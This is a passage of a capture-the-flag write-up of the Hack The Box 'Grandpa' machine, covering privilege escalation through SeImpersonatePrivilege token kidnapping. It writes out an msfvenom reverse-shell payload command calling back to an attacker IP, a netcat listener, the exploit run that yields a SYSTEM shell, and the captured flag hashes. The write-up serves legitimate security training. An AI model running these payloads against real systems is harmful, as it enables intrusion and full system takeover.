+<pre class="z-code"><code><span class="z-text z-plain">PRIVILEGES INFORMATION
+</span><span class="z-text z-plain">----------------------
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Privilege Name                Description                               State   
+</span><span class="z-text z-plain">============================= ========================================= ========
+</span><span class="z-text z-plain">SeAuditPrivilege              Generate security audits                  Disabled
+</span><span class="z-text z-plain">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+</span><span class="z-text z-plain">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+</span><span class="z-text z-plain">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+</span><span class="z-text z-plain">SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+</span><span class="z-text z-plain">SeCreateGlobalPrivilege       Create global objects                     Enabled
+</span></code></pre>
+<p>We have several privileges, including <code>SeImpersonatePrivilege</code>... exactly like
+for <a href="../granny/index.md">Granny</a>!</p>
+<h2 id="privilege-escalation-token-kidnapping">Privilege escalation (Token kidnapping)</h2>
+<p>See
+<a href="../granny/index.md#privilege-escalation-token-kidnapping">this Granny's section</a>
+for more information on this exploit.</p>
+<h3 id="preparation-1">Preparation</h3>
+<p>I'll transfer <code>token_kidnapping.exe</code> to Grandpa.</p>
+<p>I want to obtain a reverse shell, so I'll use <code>msfvenom</code> to create an executable
+for that.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> msfvenom<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>windows/shell_reverse_tcp<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> LHOST=<span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.14.10<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> LPORT=<span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>9003<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>exe<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/server/revshell.exe<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Once again, I'll transfer it to Grandpa.</p>
+<p>The last thing to do is starting a listener on port <code>9003</code> to receive the
+connection.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>9003<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Now we should be ready to go!</p>
+<h3 id="exploitation-1">Exploitation</h3>
+<p>Let's use our exploit to obtain an elevated shell.</p>
+<pre data-lang="bat" class="language-bat z-code"><code class="language-bat" data-lang="bat"><span class="z-source z-dosbatch">c:\windows\system32\inetsrv<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> C:\tmp\token_kidnapping.exe <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>C:\tmp\revshell.exe<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span>
+</span></code></pre>
+<p>If we check our listener:</p>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.10] from (UNKNOWN) [10.10.10.14] 1036
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">C:\WINDOWS\TEMP&gt;
+</span></code></pre>
+<p>It caught the reverse shell!</p>
+<h2 id="system-enumeration-1">System enumeration</h2>
+<p>If we run <code>whoami</code>, we see that we're <code>NT AUTHORITY\SYSTEM</code>!</p>
+<h3 id="flags">Flags</h3>
+<p>If we check <code>Harry</code>'s Desktop folder, we find the user flag.</p>
+<pre data-lang="bat" class="language-bat z-code"><code class="language-bat" data-lang="bat"><span class="z-source z-dosbatch">C:\WINDOWS\TEMP<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">type</span> <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>C:\Documents and Settings\Harry\Desktop\user.txt<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">bdff5ec67c3cff017f2bedc146a5d869
+</span></code></pre>
+<p>And as usual, we can find the root flag in <code>Administrator</code>'s Desktop folder.</p>
+<pre data-lang="bat" class="language-bat z-code"><code class="language-bat" data-lang="bat"><span class="z-source z-dosbatch">C:\WINDOWS\TEMP<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">type</span> <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>C:\Documents and Settings\Administrator\Desktop\root.txt<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">9359e905a2c35f861f6a57cecf28bb7b
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/grandpa/success.png" alt="Success" /></p>
+<p>That's it for this box! 🎉</p>
+<p>I rated both the user and root flags as 'Easy' to obtain. I lost a bit of time
+trying to exploit WebDAV functionalities to get a foothold, like in
+<a href="../granny/index.md">Granny</a>, but it was unsuccessful. It was easy to find a
+valid CVE for this box though, and thanks to Metasploit extremely easy to
+exploit. The privilege escalation is the same as for
+<a href="../granny/index.md">Granny</a>, so it was trivial.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
